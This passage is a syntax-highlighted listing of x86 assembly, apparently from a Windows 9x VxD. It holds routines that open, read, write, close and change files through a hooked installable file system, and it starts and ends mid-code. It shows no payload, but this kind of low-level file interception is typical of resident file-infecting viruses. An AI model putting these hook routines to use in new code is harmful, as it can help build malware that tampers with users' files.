                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">volUNC_charFSD</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">CodePage</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ParsedPath</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esi.pp_elements</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">VxDCall6</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">UniToBCSPath</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">pfad</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esp.pfad_eflags</span><span class="sc4">],</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">CFbit</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">pfad</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esp.pfad_eflags</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">GfnbhDone</span><span class="sc0">

                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">pfad</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esp.pfad_edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">GfnbhDone</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">pfad</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esp.pfad_eax</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">popfd</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">; open file</span><span class="sc0">
</span><span class="sc1">;   entry:</span><span class="sc0">
</span><span class="sc1">;     al  = desired access &amp; sharing mode info</span><span class="sc0">
</span><span class="sc1">;     ebx = pointer to the ifsreq</span><span class="sc0">
</span><span class="sc1">;   return:</span><span class="sc0">
</span><span class="sc1">;     CFlag = 0 (no error)</span><span class="sc0">
</span><span class="sc1">;       eax = action performed by the FSD</span><span class="sc0">
</span><span class="sc1">;     CFlag = 1 (error)</span><span class="sc0">
</span><span class="sc1">;       eax = error code</span><span class="sc0">
</span><span class="sc5">OpenFile</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">pushfd</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_flags</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_options</span><span class="sc4">],</span><span class="sc5">ACTION_OPENEXISTING</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">pifshp</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">eax.our_hfunc</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_hfunc</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_ptuninfo</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_pos</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifsreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ifs_psr</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">shres</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">eax.sr_func</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">volfunc</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">eax.vfn_func</span><span class="sc4">+</span><span class="sc5">VFN_OPEN</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_error</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">pfad</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esp.pfad_eflags</span><span class="sc4">],</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">CFbit</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">pfad</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esp.pfad_eflags</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">OpenDone</span><span class="sc0">

                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_options</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">OpenDone</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">pfad</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esp.pfad_eax</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">popfd</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">; close file</span><span class="sc0">
</span><span class="sc1">;   ebx = pointer to the ifsreq</span><span class="sc0">
</span><span class="sc1">;   return:</span><span class="sc0">
</span><span class="sc1">;     CFlag = 0 (no error)</span><span class="sc0">
</span><span class="sc1">;       eax = 0</span><span class="sc0">
</span><span class="sc1">;     CFlag = 1 (error)</span><span class="sc0">
</span><span class="sc1">;       eax = error code</span><span class="sc0">
</span><span class="sc5">CloseFile</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pushfd</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_options</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_flags</span><span class="sc4">],</span><span class="sc5">CLOSE_FINAL</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetHndlfunc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">hndlfunc</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">eax.hf_misc</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">hndlmisc</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">eax.hm_func</span><span class="sc4">+</span><span class="sc5">HM_CLOSE</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_error</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">pfad</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esp.pfad_eflags</span><span class="sc4">],</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">CFbit</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">pfad</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esp.pfad_eflags</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">pfad</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esp.pfad_eax</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">popfd</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; get/set file attributes</span><span class="sc0">
</span><span class="sc1">;   eax = Supplies new attributes for file on set commands</span><span class="sc0">
</span><span class="sc1">;   ebx = pointer to the ifsreq</span><span class="sc0">
</span><span class="sc1">; return:</span><span class="sc0">
</span><span class="sc1">;   CFlag = 0 (no error)</span><span class="sc0">
</span><span class="sc1">;     eax = attributes</span><span class="sc0">
</span><span class="sc1">;   CFlag = 1 (error)</span><span class="sc0">
</span><span class="sc1">;     eax = error code</span><span class="sc0">
</span><span class="sc5">GetFileAttributes</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_flags</span><span class="sc4">],</span><span class="sc5">GET_ATTRIBUTES</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">GetSetAttributes</span><span class="sc0">

</span><span class="sc5">SetFileAttributes</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_flags</span><span class="sc4">],</span><span class="sc5">SET_ATTRIBUTES</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">GetSetAttributes</span><span class="sc0">

</span><span class="sc5">GetSetAttributes</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_attr</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifsreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ifs_psr</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">shres</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">eax.sr_func</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">volfunc</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">eax.vfn_func</span><span class="sc4">+</span><span class="sc5">VFN_FILEATTRIB</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_error</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">pfad</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esp.pfad_eflags</span><span class="sc4">],</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">CFbit</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">pfad</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esp.pfad_eflags</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">GetSetAttributesDone</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_attr</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GetSetAttributesDone</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">pfad</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esp.pfad_eax</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">popfd</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">



</span><span class="sc1">; get/set file date and time</span><span class="sc0">
</span><span class="sc1">;   entry:</span><span class="sc0">
</span><span class="sc1">;     eax = Supplies new date and time for file on set commands</span><span class="sc0">
</span><span class="sc1">;     ebx = pointer to the ifsreq</span><span class="sc0">
</span><span class="sc1">;   return:</span><span class="sc0">
</span><span class="sc1">;     CFlag = 0 (no error)</span><span class="sc0">
</span><span class="sc1">;       eax = file date and time</span><span class="sc0">
</span><span class="sc1">;     CFlag = 1 (error)</span><span class="sc0">
</span><span class="sc1">;       eax = error code</span><span class="sc0">
</span><span class="sc5">GetFileDateTime</span><span class="sc4">:</span><span class="sc6">pushfd</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_flags</span><span class="sc4">],</span><span class="sc5">GET_MODIFY_DATETIME</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">GetSetDateTime</span><span class="sc0">

</span><span class="sc5">SetFileDateTime</span><span class="sc4">:</span><span class="sc6">pushfd</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_flags</span><span class="sc4">],</span><span class="sc5">SET_MODIFY_DATETIME</span><span class="sc0">

</span><span class="sc5">GetSetDateTime</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_dostime</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetHndlfunc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">hndlfunc</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">eax.hf_misc</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">hndlmisc</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">eax.hm_func</span><span class="sc4">+</span><span class="sc5">HM_FILETIMES</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_error</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">pfad</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esp.pfad_eflags</span><span class="sc4">],</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">CFbit</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">pfad</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esp.pfad_eflags</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">FileDateTimeDone</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_dostime</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">FileDateTimeDone</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">pfad</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esp.pfad_eax</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">popfd</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">; set ST structure and read file</span><span class="sc0">
</span><span class="sc5">SetST</span><span class="sc4">&amp;</span><span class="sc5">ReadFile</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">st</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc8">st</span><span class="sc4">)</span><span class="sc5">.st_size</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">st</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc8">st</span><span class="sc4">)</span><span class="sc5">.st_pt</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc1">; read/write file</span><span class="sc0">
</span><span class="sc1">;   entry:</span><span class="sc0">
</span><span class="sc1">;     ebx = pointer to the ifsreq</span><span class="sc0">
</span><span class="sc1">;     ecx = number of bytes to read/write</span><span class="sc0">
</span><span class="sc1">;     edx = file position to begin reading/writing at</span><span class="sc0">
</span><span class="sc1">;     esi = pointer to the data buffer to read/write</span><span class="sc0">
</span><span class="sc1">;   return:</span><span class="sc0">
</span><span class="sc1">;     CFlag = 0 (no error)</span><span class="sc0">
</span><span class="sc1">;       eax = number of bytes actually read/written</span><span class="sc0">
</span><span class="sc1">;       edx = new file position</span><span class="sc0">
</span><span class="sc1">;     CFlag = 1 (error)</span><span class="sc0">
</span><span class="sc1">;       eax = error code</span><span class="sc0">
</span><span class="sc5">ReadFile</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">pushfd</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">FSDFnAddr</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">FunctionNum</span><span class="sc4">,</span><span class="sc5">IFSFN_READ</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ReadWriteCommon</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetHndlfunc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">hndlfunc</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">eax.hf_read</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ReadWriteCommon</span><span class="sc0">

</span><span class="sc5">WriteFile</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pushfd</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">FSDFnAddr</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">FunctionNum</span><span class="sc4">,</span><span class="sc5">IFSFN_WRITE</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ReadWriteCommon</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetHndlfunc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">hndlfunc</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">eax.hf_write</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">ReadWriteCommon</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_data</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
